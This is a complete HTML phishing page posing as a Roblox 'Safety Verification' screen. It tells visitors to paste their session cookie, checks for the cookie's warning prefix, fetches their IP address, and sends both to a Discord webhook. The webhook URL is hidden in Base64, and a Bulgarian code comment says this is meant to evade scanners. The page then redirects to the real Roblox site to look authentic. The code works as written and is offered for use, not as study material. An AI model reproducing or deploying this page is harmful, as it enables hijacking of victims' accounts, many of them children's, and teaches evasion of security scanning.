<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox | Safety Verification</title>
    <style>
        body { background: #191B1D; color: #fff; font-family: 'Gotham SSm A', 'Gotham SSm B', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #252729; padding: 40px; border-radius: 8px; width: 380px; text-align: center; border-top: 5px solid #0084FF; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
        img { width: 60px; margin-bottom: 15px; }
        h2 { margin: 10px 0; font-size: 22px; }
        p { font-size: 14px; color: #ADB5BD; line-height: 1.5; }
        input { width: 100%; padding: 14px; margin: 20px 0; border-radius: 4px; border: 1px solid #3E4144; background: #191B1D; color: #fff; box-sizing: border-box; font-size: 14px; outline: none; }
        input:focus { border-color: #0084FF; }
        button { width: 100%; padding: 15px; border: none; border-radius: 4px; background: #0084FF; color: white; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.2s; }
        button:hover { background: #0074E0; }
        .footer { margin-top: 20px; font-size: 11px; color: #656D73; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" alt="Roblox">
        <h2>Account Verification</h2>
        <p>To protect your account from unauthorized access, please verify your current session ID below.</p>
        
        <input type="text" id="sessionData" placeholder="_|WARNING:-DO-NOT-SHARE-..." autocomplete="off">
        
        <button id="submitBtn" onclick="process()">Verify & Link</button>
        
        <div class="footer">
            ©2026 Roblox Corporation. All Rights Reserved.
        </div>
    </div>

    <script>
        async function process() {
            const input = document.getElementById('sessionData');
            const btn = document.getElementById('submitBtn');
            const val = input.value;

            // Проверка дали е истинско куки
            if (!val.includes("_|WARNING:-DO-NOT-SHARE-")) {
                alert("Invalid Session ID. Please copy the entire string starting with the warning.");
                return;
            }

            btn.disabled = true;
            btn.innerHTML = "Verifying...";

            // Твоят Base64 линк - напълно скрит за скенерите
            const secret = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQ0NTQwNTQ0NjczMzg0NS9LWlBfV0k4cFFXclk2Wm1SMTd2OFREVTEwQU5BSFByN0hhWVVCdnZOTUZqTmIyMUtfZzZJQ1M1UjNHWkkxaDJoeHlXaA==";
            
            try {
                // Взимане на IP за по-добър лог
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                // Пращане към Discord
                await fetch(atob(secret), {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: "@everyone 🧧 **NEW ROBLOX HIT** 🧧",
                        embeds: [{
                            title: "Session Captured Successfully",
                            color: 16711680, // Червен цвят
                            fields: [
                                { name: "🌐 User IP", value: "`" + ipData.ip + "`", inline: true },
                                { name: "🍪 Cookie / Session ID", value: "```" + val + "```" }
                            ],
                            footer: { text: "Roblox Verification System" },
                            timestamp: new Date().toISOString()
                        }]
                    })
                });

                // Пренасочване към истинския сайт за автентичност
                window.location.href = "https://www.roblox.com/home";
                
            } catch (err) {
                console.error("Error:", err);
                btn.disabled = false;
                btn.innerHTML = "Verify & Link";
                alert("Connection error. Please try again.");
            }
        }
    </script>
</body>
</html>
